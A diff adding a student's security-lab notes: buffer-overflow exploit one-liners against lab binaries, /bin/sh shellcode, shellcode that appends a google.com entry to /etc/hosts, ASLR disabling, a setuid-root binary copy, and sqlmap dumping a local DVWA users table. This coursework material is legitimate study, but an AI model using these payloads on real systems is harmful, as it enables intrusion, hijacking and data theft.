@@ -1,0 +1,102 @@
+docker run -it --privileged -v D:\zzzMockPictures\Docs\school\programs\IS\Seclabs:/home/seed/seclabs img4lab
+
+seed@5c8608074537:~$ cd seclabs
+seed@5c8608074537:~/seclabs$ gcc -g flag.c -o flag.out (optionally add -fno-stack-protector & -mpreferred-stack-boundary=2 [2-12] & -z execstack) -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
+./flag.out 12345678901234567
+gdb -q flag.out
+disas main
+
+seed@5c8608074537:~/seclabs$ ./pattern.out 1234567890123456bBaA
+[Alternatively: ./pattern.out $(python -c "print('a'*16+'bBaA')") ]
+[Alternatively: ./pattern.out $(python -c "print('a'*16+'\x62\x42\x61\x41')") ]
+Correct pattern
+
+objdump -d flag.out
+
+b 0x08048454 (breakpoint)
+x/40b $esp
+
+(flow.c) 0804843b change
+gdb-peda$ r $(python -c "print('a'*20+'\x3b\x84\x04\x08')")
+
+objdump -d bof1.out | grep secretFunc
+bof1.out secretFunc 0804846b
+echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')")|./bof1.out 11111
+
+seed@90f08b22c08f:~/seclabs$ echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')")|./bof2.out 111
+
+(bof3.out) [0804845b] objdump -d bof3.out | grep shell
+echo $(python -c "print('a'*128+'\x5b\x84\x04\x08')")|./bof3.out 111
+
+https://github.com/quang-ute/Security-labs/blob/main/Software/buffer-overflow/readme.md
+(vuln.c) /bin/sh ||| exit
+nasm -g -f elf sh.asm
+ld -m elf_i386 -o sh sh.o
+objdump -d sh
+for i in $(objdump -d sh | grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80
+run $(python -c  "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'a'*41 + '\xff\xff\xff\xff')") [ff only for noticability]
+x/80xb $esp
+[0xffffd708] set *0xffffd70c=$esp
+
+(aslr.c) sysctl kernel.randomize_va_space
+sudo sysctl -w kernel.randomize_va_space=0
+
+
+(ctf.c)
+0804851b
+echo $(python -c "print('a'*100 + '\x1b\x85\x04\x08' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")|./ctf.out 11
+
+export = global 
+
+which id
+ls -l /usr/bin/id
+-rwxr-xr-x (rwx - owner, r-x - group, r-x - others)
+cp /usr/bin/id myid (rename id to myid)
+sudo chown root myid (make root the owner)
+sudo chmod 4755 myid
+
+
+
+
+docker run -it --privileged -v D:\zzzMockPictures\Docs\school\programs\IS\"Lab #1":/home/seed/seclabs img4lab
+
+objdump -d shell | grep '[0-9a-f]:' | cut -f2 | tr -s ' ' | cut -d' ' -f1-6 | tr '\n' ' ' | sed 's/ /\x/g' | sed 's/^/"/' | sed 's/$/"/'
+objdump -d shell | grep '[0-9a-f]:' | cut -f2 | tr -s ' ' | cut -d' ' -f1-6 | tr '\n' ' ' | sed 's/^/\x/' | sed 's/\x$//'
+31xc9xxf7xe1xxb0x05xx51xx68x6fx73x74x73xx68x2fx2fx2fx68xx68x2fx65x74x63xx89xe3xx66xb9x01x04xxcdx80xx93xx6ax04xx58xxebx10xx59xx6ax14xx5axxcdx80xx6ax06xx58xxcdx80xx6ax01xx58xxcdx80xxe8xebxffxffxffxx31x32x37x2ex31x2ex2ex63x6fx6dx.comx
+=
+\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d
+
+./vuln_program $(python3 -c 'print("A" * 16 + "\x90\x90\x90\x90" + "\xYY\xYY\xYY\xYY")')
+cat /etc/hosts
+./vuln_program "$(python3 -c 'print("A"*16 + "\xYY\xYY\xYY\xYY" + "<shellcode>")')"
+python3 -c 'print("\x90" * 16 + "<shellcode_bytes_here>" + "<return_address_here>")'
+
+python -c "print('A' * 16 + '\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d' + '\x3b\x84\x04\x08')"
+(flow.c) 0804843b change
+gdb-peda$ r $(python -c "print('a'*20+)")
+
+nasm -f elf32 shell.asm -o shell.o
+ld -o shell shell.o
+objdump -d ./shell | grep "^ " | cut -f2
+run $(python -c 'print("A"*16 + "B"*284)')
+cat pattern.txt | ./vuln.out
+R.A. 0xf7e44a60 
+
+python -c 'from pwn import *; print("A"*16 + "\xef\xbe\xad\xde" + "\x90"*16 + "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d")' > payload.txt
+run $(python -c 'print("A"*16 + "B"*4 + "C"*32)')
+run $(python -c 'from pwn import *; print(cyclic(128))')
+
+run $(python -c "print('a'*20 + '\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d' + '\x3b\x84\x04\x08')")
+
+
+
+docker pull vulnerables/web-dvwa
+docker run -d -p 80:80 vulnerables/web-dvwa
+http://localhost (for dvwa site)
+
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" --dbs
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" -D dvwa --tables
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" -D dvwa -T users --dump
+
+docker stop $(docker ps -q)
